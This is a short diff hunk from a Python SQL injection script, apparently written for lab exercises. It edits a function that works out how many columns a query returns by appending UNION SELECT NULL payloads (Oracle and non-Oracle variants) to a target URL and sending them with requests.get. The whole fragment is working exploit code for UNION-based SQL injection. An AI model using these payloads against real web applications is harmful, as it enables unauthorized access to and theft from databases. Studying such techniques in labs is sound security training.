@@ -45,7 +45,7 @@ def determine_number_of_columns(url, no_proxy, oracle=False):
         if oracle:
             category = f"' UNION SELECT {nulls} FROM dual-- "
         else:
-            category = f"' UNION SELECT {nulls} FROM dual-- "
+            category = f"' UNION SELECT {nulls}-- "
         exploit_url = url + category
         if no_proxy: 
             resp = requests.get(exploit_url)
